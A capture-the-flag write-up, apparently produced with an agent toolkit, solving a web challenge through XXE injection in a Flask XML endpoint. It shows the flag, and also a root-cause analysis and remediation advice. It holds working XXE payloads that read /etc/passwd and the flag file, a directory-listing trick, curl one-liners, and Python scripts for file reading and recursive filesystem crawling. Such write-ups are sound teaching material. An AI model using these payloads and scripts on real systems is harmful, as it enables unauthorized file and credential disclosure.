# Archived — CTF Writeup

| | |
|---|---|
| **Challenge** | Archived |
| **Category** | Web |
| **Points** | 250 |
| **Target** | `http://54.72.82.22:8230` |
| **Flag** | `safctf{960c0e8a73c24bd9b1aee314ded96157}` |
| **Vulnerability** | XML External Entity (XXE) injection → arbitrary file read (CWE-611) |

---

## 1. TL;DR

The landing page ships a "Fetch User Data" form that serialises the `User ID` input
into a **hand-built XML document** (`<request><id>…</id></request>`) and POSTs it to
`/fetch_user` with `Content-Type: application/xml`.

The server parses that XML with a parser that **resolves external entities and allows
`file://` SYSTEM entities**. Because the value of `<id>` is echoed straight back into
the response body (`<user><id>…</id>…`), this is a classic **in-band XXE**, giving
arbitrary local file read with direct output.

A single request reads the flag file sitting at the root of the container:

```
GET  /                     → HTML form + JS showing the /fetch_user XML contract
POST /fetch_user  (XXE)    → <user><id>safctf{960c0e8a73c24bd9b1aee314ded96157}</id>…
```

---

## 2. Reconnaissance

### 2.1 Service fingerprint

```
$ curl -s -i http://54.72.82.22:8230/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.9.25
Content-Type: text/html; charset=utf-8
Content-Length: 11556
Access-Control-Allow-Origin: *
Connection: close
```

`Werkzeug / Python` → a **Flask** application. Nothing else on the box was reachable
at this port; a directory sweep of common paths (`/robots.txt`, `/api`, `/user`,
`/admin`, `/debug`, …) returned a uniform 207-byte werkzeug `404`.

```bash
for p in robots.txt sitemap.xml api api/user users user health debug; do
  curl -s -o /dev/null -w "$p %{http_code} %{size_download}\n" http://54.72.82.22:8230/$p
done
# robots.txt 404 207 ; sitemap.xml 404 207 ; api 404 207 ; ... (all 404 / 207)
```

### 2.2 The page

Stripping the decorative `<style>` block leaves the entire application:

```html
<div class="container">
    <h1>Fetch User Data</h1>
    <form id="user-form">
        <label for="user_id">User ID:</label>
        <input type="text" id="user_id" name="user_id" required>
        <button type="submit">Fetch Data</button>
    </form>
    <div id="user-data" class="result" style="display: none;">
        <h2>User Details:</h2><ul id="user-details"></ul>
    </div>
    <div id="error-message" class="result" style="display: none;">
        <h2>Error:</h2><p id="error-text"></p>
    </div>
</div>
```

### 2.3 The client-side JS — the whole contract

```javascript
document.getElementById('user-form').addEventListener('submit', async function (e) {
    e.preventDefault();
    const userId = document.getElementById('user_id').value;

    // Prepare XML request body
    const requestXml = `
        <request>
            <id>${userId}</id>
        </request>
    `;

    const response = await fetch('/fetch_user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: requestXml
    });
    ...
});
```

Two things stand out immediately:

1. **Hand-rolled XML via string interpolation** — no escaping, and the server parses it.
2. **An XML API endpoint** — `POST /fetch_user`, `application/xml`.

An endpoint that *parses attacker-supplied XML* is an instant XXE candidate.

### 2.4 Baseline behaviour of `/fetch_user`

```bash
$ curl -s -X POST http://54.72.82.22:8230/fetch_user \
       -H 'Content-Type: application/xml' \
       --data '<request><id>1</id></request>'
<user><id>45905544</id><name>Mkenya Halisi</name><phone_number>254797000111</phone_number><balance>17000.00</balance></user>

$ curl -s -X POST http://54.72.82.22:8230/fetch_user \
       -H 'Content-Type: application/xml' \
       --data '<request><id>2</id></request>'
<user><id>33001122</id><name>Juma Mwenesi</name><phone_number>254722111222</phone_number><balance>5000.00</balance></user>
```

Error shape (note the `Content-Type: application/xml` on the 400):

```
$ curl -s -i -X POST http://54.72.82.22:8230/fetch_user \
       -H 'Content-Type: application/xml' --data 'notxml' | head -8
HTTP/1.1 400 BAD REQUEST
Content-Type: application/xml; charset=utf-8
Content-Length: 34
<error>Missing id element.</error>
```

`id` is a **row index**, not the real account number: `id=1` returns the record whose
`<id>` is `45905544`. Enumerating `0..20` shows four populated records and blanks
after that — a tiny seeded dataset, not a database worth attacking further.

```
0  -> <user><id>0</id>…              (empty)
1  -> 45905544  Mkenya Halisi  /  17000.00
2  -> 33001122  Juma Mwenesi   /   5000.00
3  -> 38999222  Afya Bora      /   2300.00
4  -> 35334269  Alex Kimani    /   5000.00
5..999, admin, "1 OR 1=1" -> echoed back empty (no SQLi — it's a dict lookup)
```

---

## 3. Confirming XXE

Because `<id>` is reflected into the response, a **file-based SYSTEM entity** should
dump straight into the `<id>` element. Test with `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request><id>&xxe;</id></request>
```

```bash
$ curl -s -X POST http://54.72.82.22:8230/fetch_user \
       -H 'Content-Type: application/xml' --data-binary @xxe_passwd.xml
```

Response:

```xml
<user><id>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
ctfuser:x:1001:1001::/home/ctfuser:/bin/bash
</id><name></name><phone_number></phone_number><balance></balance></user>
```

**Arbitrary file read confirmed.** The container has a non-root service account,
`ctfuser` (uid 1001), and the usual `ubuntu` (uid 1000).

---

## 4. Enumerating the filesystem through XXE

### 4.1 Directory listing — a free `ls`

The parser (lxml semantics) treats `file://` pointing at a **directory** as a
resolvable entity and returns the directory listing. This turns the file-read bug
into a full filesystem crawler.

```bash
$ # equivalent of: ls /
$ curl -s -X POST http://54.72.82.22:8230/fetch_user \
    -H 'Content-Type: application/xml' \
    --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:////">]><r><id>&x;</id></r>'
```

```xml
<user><id>__cacert_entrypoint.sh
.dockerenv
.rock
bin
boot
dev
etc
flag8b9d5b8e264a.txt      ← 🚩
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</id>…
```

Note the **trailing slash on the URI** (`file:///path/to/dir/`) is what triggers the
listing; without it the entity fails to resolve.

### 4.2 Interesting findings

| Path | Notes |
|---|---|
| `/flag8b9d5b8e264a.txt` | **the flag file** |
| `/home/ctfuser/app.jar` | Java archive — flavour for the "second archive" hint |
| `/home/ctfuser`, `/root` | cwd of the Flask worker is `/home/ctfuser` |
| `/opt/java/openjdk` | Eclipse Temurin **JRE 17.0.20.1** |
| `/tmp/hsperfdata_ctfuser/1`, `/tmp/tomcat.8080.*` | a JVM/Tomcat runs in the same image |
| `/var/lib/pebble/default` | image is a Canonical **rock** (Pebble-supervised) |
| `/root`, `/srv`, `/var/tmp`, `/mnt` | *not* listable → worker runs as **non-root** (`ctfuser`) |

The `/tmp/hsperfdata_*` + `tomcat.8080.*` entries are the in-universe "second
archive" from the challenge blurb (*"a catalog card points to a second archive,
though its contents may be unrelated"*) — that Tomcat is **not** published to the
host (host `:8080` is a different, unrelated service, `ORBIT DISPATCH`), so it is
flavour rather than a required pivot. The primary artefact is the flag file.

---

## 5. Reading the flag

```bash
$ cat flag_read.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "file:///flag8b9d5b8e264a.txt">
]>
<request><id>&xxe;</id></request>
```

```bash
$ curl -s -i -X POST http://54.72.82.22:8230/fetch_user \
       -H 'Content-Type: application/xml' --data-binary @flag_read.xml
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.9.25
Content-Type: application/xml; charset=utf-8
Content-Length: 124
Access-Control-Allow-Origin: *
Connection: close

<user><id>safctf{960c0e8a73c24bd9b1aee314ded96157}
</id><name></name><phone_number></phone_number><balance></balance></user>
```

> **🚩 Flag: `safctf{960c0e8a73c24bd9b1aee314ded96157}`**

There is no `/submit` route on this service (it 404s for both `GET` and `POST`, as
does a malformed body — i.e. a genuinely absent route, not a rejecting one), so the
flag is read directly out of the artefact.

---

## 6. Parser quirks worth knowing (and how they shaped the exploit)

These are the behaviours that cost time and are worth writing down.

### 6.1 External entities are **parsed as XML**, not read as raw bytes

An external `SYSTEM` entity is a *parsed* external entity: the target file must
itself be well-formed XML text. Consequences observed:

* Plain text files (no `<` / `&`) work perfectly → `/etc/passwd`, `/etc/hostname`.
* Binary files fail → `file:///home/ctfuser/app.jar` returns `<error>Invalid input</error>`.
  The jar therefore **cannot be read directly** through this primitive (no base64/`php://filter`
  equivalent exists in an lxml pipeline), which is why the on-disk flag file is the
  intended artefact rather than anything inside the jar.

### 6.2 No out-of-band / SSRF

HTTP(S) entities are refused (the parser runs with `no_network=True` semantics):

```
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">  → <error>Invalid input</error>
<!ENTITY xxe SYSTEM "http://localhost:8080/">  → <error>Invalid input</error>
```

So this is a **file-only, in-band XXE** — no OOB exfiltration and no SSRF pivot to
the internal Tomcat was possible.

### 6.3 `/proc/<pid>/*` files are blocked, but `/proc/self/cwd/` is not

Every procfs *file* tried returned the generic error, while the *directory listing*
of `/proc/self/cwd/` resolved:

```
/proc/self/comm      → <error>Invalid input</error>
/proc/self/environ   → <error>Invalid input</error>
/proc/self/cmdline   → <error>Invalid input</error>
/proc/self/status    → <error>Invalid input</error>
/proc/version        → <error>Invalid input</error>
/proc/self/cwd/      → .bash_logout  .bashrc  .profile  app.jar   ✅
```

Two useful by-products:

* `/proc/self/cwd/` revealed the Flask worker's working directory **without knowing
  it in advance** — a nice trick when the app is deployed somewhere unusual.
* The failure mode is identical to a non-existent file, so the "not found" oracle
  can be used to probe existence (e.g. `/nonexistent-xyz` → same error).

### 6.4 A generic error swallows everything

The application returns a single `<error>Invalid input</error>` (HTTP 400) for
*all* parser failures — missing file, binary file, disallowed scheme. Distinguishing
"file absent" from "file present but unparseable" requires an auxiliary oracle
(e.g. compare against a known-good path).

---

## 7. Root cause

The server builds and parses XML without disabling external entity resolution —
the classic CWE-611 pattern. The vulnerable shape in the (reconstructed) Flask handler:

```python
@app.route("/fetch_user", methods=["POST"])
def fetch_user():
    root = etree.fromstring(request.data)          # ← entity resolution left ON
    user_id = root.findtext("id")
    ...
    return f"<user><id>{row['id']}</id>…</user>"
```

Two independent defects combine:

1. **XML parsing with external entities enabled** — the injection.
2. **Reflecting the parsed value into the response** — turns a blind bug into a
   full in-band disclosure, and (in the browser client) also produces DOM XSS since
   the JS writes `innerHTML` from the response.

The client is equally at fault for hand-assembling XML with template literals:

```javascript
const requestXml = `<request><id>${userId}</id></request>`;  // no escaping
```

---

## 8. Remediation

| # | Fix |
|---|---|
| 1 | **Disable DTDs / external entities** on the parser. For `lxml`: `etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)`. For stdlib `xml.etree`, `defusedxml` handles this. |
| 2 | Prefer a **non-XML wire format** (JSON) for this endpoint; XML is unnecessary here. |
| 3 | If XML is mandatory, use **`defusedxml`** (`defusedxml.lxml.parse` / `defusedxml.ElementTree`) which forbids DTDs and entity expansion by default. |
| 4 | Never build XML by string concatenation on the client (`<id>${userId}</id>`); use `Document`/`XMLSerializer` or a JSON body. |
| 5 | **Escape on output** — the browser client injects the XML response via `innerHTML`, so the same bug is also DOM XSS. |
| 6 | Run the service as an **unprivileged, least-privilege** user (it already does — `ctfuser` — which limited the blast radius; keep it that way). |
| 7 | Don't place flag/secret files where the service account can read them as plain text. |

---

## 9. Attack chain summary

```
Recon           Werkzeug/Flask on :8230, form posts hand-built XML to /fetch_user
                  │
Identify        XML endpoint + string-interpolated body  →  XXE candidate
                  │
Confirm         <!ENTITY xxe SYSTEM "file:///etc/passwd">  →  /etc/passwd in <id>
                  │
Enumerate       file:///dir/  ⇒ directory listing  ⇒ full FS crawl
                  │
Target          /  lists  flag8b9d5b8e264a.txt
                  │
Exploit         <!ENTITY xxe SYSTEM "file:///flag8b9d5b8e264a.txt">
                  │
Flag            safctf{960c0e8a73c24bd9b1aee314ded96157}
```

---

## 10. Appendix — scripts

### 10.1 `xxe.py` — minimal in-band reader

```python
#!/usr/bin/env python3
"""Read files from the Archived challenge via the XXE in /fetch_user."""
import sys, re, urllib.request, urllib.error

URL = "http://54.72.82.22:8230/fetch_user"

def read_file(path, wrapper="id"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "file://{path}">
]>
<request><{wrapper}>&xxe;</{wrapper}></request>'''
    req = urllib.request.Request(URL, data=xml.encode(),
                                 headers={"Content-Type": "application/xml"})
    with urllib.request.urlopen(req, timeout=30) as r:
        body = r.read().decode("utf-8", "replace")
    m = re.search(rf"<{wrapper}>(.*?)</{wrapper}>", body, re.S)
    return m.group(1) if m else "[NOT FOUND / UNPARSEABLE]"

if __name__ == "__main__":
    for p in sys.argv[1:]:
        print(f"===== {p} =====")
        try:
            print(read_file(p))
        except Exception as e:
            print(f"[ERR] {e}")
```

One-shot reproduction of the whole solve:

```bash
python3 xxe.py /etc/passwd
python3 xxe.py /            # directory listing
python3 xxe.py /flag8b9d5b8e264a.txt
```

### 10.2 `crawl.py` — recursive filesystem crawler

Directories are discovered by testing each entry with a trailing slash; entries whose
`file://<name>/` resolves are recursed into.

```python
#!/usr/bin/env python3
"""Recursive directory crawler over the XXE directory-listing primitive."""
import re, sys, urllib.request, json

URL = "http://54.72.82.22:8230/fetch_user"
SKIP = {"/proc", "/sys", "/dev", "/usr/share", "/usr/lib", "/usr/lib64",
        "/usr/include", "/usr/src", "/var/lib/dpkg", "/var/lib/apt",
        "/etc/ssl", "/etc/alternatives", "/etc/terminfo",
        "/opt/java/openjdk/lib", "/opt/java/openjdk/legal", "/opt/java/openjdk/conf"}

def read(path):
    xml = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{path}">]><r><id>&x;</id></r>'
    req = urllib.request.Request(URL, data=xml.encode(),
                                 headers={"Content-Type": "application/xml"})
    try:
        b = urllib.request.urlopen(req, timeout=25).read().decode("utf-8", "replace")
    except Exception:
        return None
    m = re.search(r"<id>(.*?)</id>", b, re.S)
    return m.group(1) if m else None

def ls(d):
    v = read(d if d.endswith("/") else d + "/")
    return [x for x in v.split("\n") if x] if v is not None else None

def crawl(root, maxdepth=4):
    tree = []
    def rec(d, depth):
        if depth > maxdepth or d in SKIP:
            return
        entries = ls(d)
        tree.append((d, entries))
        if entries is None:
            return
        for e in entries:
            full = d.rstrip("/") + "/" + e
            if "." not in e or e.endswith(".d"):
                rec(full, depth + 1)
    rec(root, 0)
    for d, e in tree:
        print(f"{d}  ->  {e}")

if __name__ == "__main__":
    for r in (sys.argv[1:] or ["/"]):
        print(f"########## CRAWL {r}")
        crawl(r, maxdepth=3)
```

### 10.3 `flag_read.xml` — the payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "file:///flag8b9d5b8e264a.txt">
]>
<request><id>&xxe;</id></request>
```

### 10.4 Minimal `curl` one-liner

```bash
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag8b9d5b8e264a.txt">]><r><id>&x;</id></r>'
```

---

## 11. References

* HackTricks — *XXE / XEE / XML External Entity* — https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
* PortSwigger Web Security Academy — *What is XXE injection?* — https://portswigger.net/web-security/xxe
* OWASP — *XML External Entity (XXE) Processing* (CWE-611) — https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
* MITRE — CWE-611: Improper Restriction of XML External Entity Reference — https://cwe.mitre.org/data/definitions/611.html

*(Technique references retrieved via the BlackBook knowledge server. No WAF was present:
`wafw00f`-style probing and a manual GET sweep of common paths returned only werkzeug 404s —
the sole interesting route, `/fetch_user`, is POST-only and therefore invisible to
wordlist-based content discovery. HexStrike's standard toolkit was available but the
in-band XXE needed nothing beyond `curl`.)*
